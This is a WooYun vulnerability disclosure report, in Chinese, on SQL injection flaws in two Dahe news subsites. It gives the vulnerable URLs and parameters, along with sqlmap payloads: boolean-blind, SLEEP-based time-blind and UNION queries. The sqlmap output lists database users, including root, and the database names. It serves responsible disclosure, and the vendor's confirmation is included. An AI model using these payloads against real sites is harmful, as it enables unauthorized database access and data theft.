wybug_title: 大河网#2个分站存在SQL注射漏洞
wybug_detail:
漏洞详情 披露状态：   									2013-11-27：	细节已通知厂商并且等待厂商处理中									2013-11-28：	厂商已经确认，细节仅向厂商公开									2013-12-08：	细节向核心白帽子及相关领域专家公开									2013-12-18：	细节向普通白帽子公开									2013-12-28：	细节向实习白帽子公开									2014-01-11：	细节向公众公开  简要描述： 大河网#2个分站存在SQL注射漏洞 详细说明：  站点1：http://zzb.dahe.cnlayid没有过滤，导致注射http://zzb.dahe.cn/fore/onclickNews.shtml?fdate=&layoutID=1sqlmap跑起sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: layoutID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: fdate=&layoutID=1 AND 4748=4748    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: fdate=&layoutID=1 AND SLEEP(5)---[17:45:36] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.11[17:45:36] [INFO] fetching current user[17:45:36] [INFO] resumed: zzb@%current user:    'zzb@%'[17:45:36] [INFO] fetching current database[17:45:36] [INFO] resumed: newspapercurrent database:    'newspaper'[17:45:36] [INFO] fetching database names[17:45:36] [INFO] fetching number of databases[17:45:36] [INFO] resumed: 6[17:45:36] [INFO] resumed: information_schema[17:45:36] [INFO] resumed: jd[17:45:36] [INFO] resumed: mysql[17:45:36] [INFO] resumed: newspaper[17:45:36] [INFO] resumed: test[17:45:36] [INFO] resumed: zzbgbkavailable databases [6]:[*] information_schema[*] jd[*] mysql[*] newspaper[*] test[*] zzbgbk--------------------------我是分割线---------------------------------站点2：http://jlb.96211.comid没有过滤，导致注射。与 WooYun: 大河网#3个分站存在SQL注射漏洞（root用户） 属于同一站点，注入点不同http://jlb.96211.com/Previous/SiteProd/ProdM_List_bianming.php?Id=285sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: Id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Id=285 AND 5969=5969    Type: UNION query    Title: MySQL UNION query (NULL) - 12 columns    Payload: Id=285 LIMIT 1,1 UNION ALL SELECT CONCAT(0x3a6167693a,0x495a47565273546e7775,0x3a7975693a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#---[16:06:59] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: MySQL 5[16:06:59] [INFO] fetching current usercurrent user:    'root@localhost'[16:06:59] [INFO] fetching current databasecurrent database:    'dahebao'[16:06:59] [INFO] fetching database names[16:06:59] [INFO] the SQL query used returns 17 entries[16:06:59] [INFO] resumed: "information_schema"[16:06:59] [INFO] resumed: "170"[16:06:59] [INFO] resumed: "clubwap"[16:06:59] [INFO] resumed: "cmswap"[16:06:59] [INFO] resumed: "dahebao"[16:06:59] [INFO] resumed: "dahevote"[16:06:59] [INFO] resumed: "dvote"[16:06:59] [INFO] resumed: "dvote_2"[16:06:59] [INFO] resumed: "ebvote"[16:06:59] [INFO] resumed: "guozheng"[16:06:59] [INFO] resumed: "love"[16:06:59] [INFO] resumed: "mysql"[16:06:59] [INFO] resumed: "php168"[16:06:59] [INFO] resumed: "phpcms"[16:06:59] [INFO] resumed: "phpcms2010"[16:06:59] [INFO] resumed: "test"[16:06:59] [INFO] resumed: "tuan"root用户

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-11-28 09:06 厂商回复： 收到，谢谢，我们抓紧处理。 最新状态： 暂无
